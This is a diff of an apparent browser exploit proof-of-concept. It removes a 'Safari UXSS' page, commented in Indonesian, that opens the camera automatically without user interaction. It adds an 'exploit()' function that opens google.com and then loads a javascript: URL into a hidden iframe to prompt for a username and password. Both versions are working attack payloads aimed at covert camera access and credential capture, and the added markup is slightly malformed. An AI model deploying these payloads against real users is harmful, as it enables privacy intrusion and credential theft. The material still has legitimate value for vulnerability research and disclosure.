@@ -1,35 +1,22 @@
-<!-- Filename: poc-uxss-camera.html -->
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Safari UXSS Auto Camera Trigger</title>
-</head>
-<body>
-  <h2>🧪 Safari UXSS + Camera Auto Trigger (iOS 17)</h2>
-
-  <script>
-    // Simulasi skenario: sudah dalam context spoofed origin (bypass SOP)
-    // Karena UXSS bug memungkinkan code attacker dijalankan di context 'trusted'
-    (async () => {
-      try {
-        // Trigger kamera secara langsung tanpa interaksi
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-
-        // Buat elemen video
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.autoplay = true;
-        video.playsInline = true;
-        video.style.width = '300px';
-        document.body.appendChild(video);
-
-        // Tambahkan instruksi untuk memastikan user sadar
-        document.body.innerHTML += "<p><b>📸 Kamera telah dibuka otomatis</b> — UXSS active.</p>";
-
-      } catch (e) {
-        document.body.innerHTML += `<p style='color:red;'>❌ Kamera gagal diakses: ${e.message}</p>`;
+  <body>
+    <script>
+      function exploit() {
+        window.open("https://www.google.com");
+        
+        setTimeout(function () {
+          document.getElementById("iframe").src =
+            "javascript:let username = prompt('Enter your username');" +
+            "let password = prompt('Enter your password');" +
+            "alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);";
+        }, 2000); 
       }
-    })();
-  </script>
-</body>
+    </script>
+
+      <button onclick="exploit()">Click</button>
+    </a>
+
+    <iframe id="iframe" style="display:none;" src=""></iframe>
+  </body>
 </html>
